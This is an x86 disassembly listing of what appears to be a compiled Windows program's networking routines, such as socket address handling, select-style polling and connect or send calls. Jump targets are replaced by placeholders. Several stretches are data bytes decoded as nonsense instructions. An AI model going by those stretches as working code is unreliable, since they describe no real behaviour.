add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
or eax 0x53644945
je r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_46cf60
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x3c00408d
iretd
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 8 ] bh
inc esi
add [ eax + eax ] cl
add [ eax ] al
sub dh cl
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
outsd
jb r-xdata
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
rcl al 0xce
sub_46cf60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_46d014
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_46cfa8
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_46d007
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d00e
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
sub_46d014
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d066
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b7f0
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d06d
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_46d0a0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_407f14
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_46d54c
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_403fa4
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_403fa4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46d118
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_46d512
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f50
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408df4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d519
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
jmp [ eax * 4 + jump_table_46d158 ]
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
sub_46d520
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_4081f8
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_4081f8
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_46d54c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_46d60b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403fe8
mov eax [ ebp - 0x8 ]
call sub_46d520
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_46d520
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d612
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403f74
retn
mov eax [ ebp - 0x10 ]
call sub_46d520
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_46d520
test al al
jne r-xdata
mov bl 0x1
sub_46d628
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_46d658
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_46d6a0
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d6a7
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_46d6b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46d6d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d6dc
retn
sub_46d6e8
xor al 0xd7
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 + 0x46 ] al
add [ eax ] cl
add [ eax ] eax
add al dl
int3
sub_46d799
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] al
fld [ esi ]
add al 0xe2
inc esi
add [ edx - 0x2083ffba ] ch
inc esi
add [ eax + ebx * 8 ] bh
inc esi
add al bl
fld [ esi ]
push 0xd40046da
fiadd [ esi ]
loopne r-xdata
inc esi
add [ eax ] dh
fild [ esi ]
fcomp st3
inc esi
add [ ebx + ebx * 8 - 0x2023ffba ] cl
inc esi
add ah ah
loopne r-xdata
in eax 0x46
add [ eax ] ch
add ah al
fild [ esi ]
sbb ah bl
inc esi
add al dl
fild [ esi ]
in al dx
loope r-xdata
call sub_46d074
cmp [ rw-data ] 0x0
jne r-xdata
add [ edi ] cl
push esp
dec ecx
push ebx
je r-xdata
add al bh
loope r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d8e1
lea eax [ ebp - 0x194 ]
call sub_403f50
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_46cb44
inc eax
jne r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
push edi
fld [ esi ]
nop
jecxz r-xdata
add [ esp + ebx * 8 ] ah
inc esi
add [ eax - 0x24 ] al
inc esi
add [ ebp + ebx * 8 - 0x212bffba ] bh
inc esi
add al dh
fiadd [ esi ]
pop esp
fild [ esi ]
lodsb [ esi ]
fild [ esi ]
insb
in al 0x46
add ah bl
out 0x46 al
add [ eax + 0x780046df ] ah
in al 0x46
add [ eax ] bl
in eax 0x46
add [ eax + 0x280046e5 ] bh
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46d8da
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
add esp 0xfffffff0
call sub_4034a0
sub_46d900
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46d628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_46d928
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_46d9bc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_408080
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_408080
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_408080
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_408080
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_4042d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d9c3
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f74
retn
sub_46d9cf
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46da57
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_403fa4
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da5e
lea eax [ ebp - 0x1c ]
call sub_403f50
retn
sub_46da68
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_404210
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_46d658
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46dae0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_46d658
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46db30
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_404410
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_46cf54
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_46db8c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_404410
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_404148
or edx 0xffffffff
mov eax esi
call sub_46cf54
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_46dbdc
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_40459c
mov eax [ ebx ]
call sub_404210
push eax
mov eax [ ebx ]
call sub_404410
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_404410
mov edx eax
mov eax ebx
call sub_404148
pop ebx
retn
sub_46dc24
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_46dc40
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46dccb
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_403fa4
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dcd2
lea eax [ ebp - 0x1c ]
call sub_403f50
retn
sub_46dcdc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_41876c
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_418454
add ebx 0x4
dec esi
jne r-xdata
sub_46dd18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46ddad
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ddb4
lea eax [ ebp - 0xc ]
call sub_403f50
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4185b0
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_46ddbc
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402b5c
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402b5c
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402b5c
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_46dd18
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_46dd18
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_46dd18
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_46dcdc
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_46dcdc
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_46dcdc
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46ded4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_46def0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402b5c
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_46d658
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46df5c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_46df7c
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0xc ] eax
sub_46dfdc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_46e0a9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_403748
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4081bc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e0b0
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
sub_46e0cf
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_46e1d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405110
xor eax eax
push ebp
push sub_46e19e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_404148
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_40514c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e1e0
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405110
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404148
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_46e1a3
mov eax [ ebp - 0x4 ]
call sub_403154
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e1e0
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405110
retn
sub_46e204
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_46e29e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_404410
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_46cf54
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e2a5
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f74
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_46e2ac
push ebx
push esi
mov esi edx
